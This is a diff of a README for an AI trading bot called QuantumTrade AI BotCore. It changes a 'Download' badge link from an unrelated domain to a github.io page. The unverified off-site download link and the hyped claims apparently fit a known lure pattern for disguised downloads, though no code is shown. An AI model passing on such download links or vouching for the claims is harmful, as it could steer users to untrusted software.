@@ -2,7 +2,7 @@
 
 💹 **QuantumTrade AI BotCore** is your smart assistant in the world of algorithmic trading. Driven by cutting-edge AI and real-time analytics, this bot learns from the market and makes intelligent decisions for crypto, stocks, and forex trading.
 
-[![Download QuantumTrade AI](https://img.shields.io/badge/Download-QuantumTrade_AI-blueviolet)](https://seomadjest.com/)
+[![Download QuantumTrade AI](https://img.shields.io/badge/Download-QuantumTrade_AI-blueviolet)](https://quantumtrade-ai.github.io/.github/)
 
 ---
 
